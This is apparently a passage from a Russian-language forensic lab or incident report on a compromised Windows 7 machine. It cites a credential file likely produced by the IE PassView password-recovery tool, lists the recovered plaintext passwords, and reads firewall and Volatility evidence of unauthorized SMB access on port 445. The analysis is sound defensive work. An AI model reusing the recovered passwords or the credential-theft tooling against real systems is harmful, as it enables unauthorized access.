учетная запись: Идентификатор безопасности:  S-1-5-21-3583694148-1414552638-2922671848-1004 Имя учетной записи:  Support Домен учетной записи:  IEWIN7Файл с паролями был и судя по всему кража паролей таки произошла. Файл passwords.txt был вероятно результатом работы программы IE PassView (файл iepv.exe о котором уже говорил ранее). Могу подметить что пользователь не особо думал над сложностью своих паролей12345Password!NoMoreFunSuperPasswordHaveNoIdeaНесанкционированный доступ через NetBIOS (smb) было или нет? Вероятнее всего данное событие имело место быть, так как имеется следющая запись в журнале безопасностиВ список исключений брандмауэра Защитника Windows добавлено правило.Добавленное правило: ИД правила: {9F02E645-89A2-48E1-B23D-9DDBB413012B} Имя правила: File and Printer Sharing (SMB-In) Источник: Локальный Активно: Нет Направление: Входящий Профили: Публичный Действие: Разрешить Путь приложения: System Имя службы:  Протокол: TCP Параметры безопасности: Отсутствует Обход узлов: Отсутствует Изменивший пользователь: S-1-5-21-3583694148-1414552638-2922671848-1003 Изменившее приложение: C:\Windows\System32\dllhost.exeТак же в выводе команды netscan в volatility можно увидеть сетевую активностьпо 445 портыИз этого можно предположить что имело место несанкционированное сканирование общих ресурсов NetBIOS ","{""/CreationDate"": ""D:20231003221621+04'00'"", ""/Creator"": ""Writer"", ""/Producer"": ""LibreOffice 7.5""}"
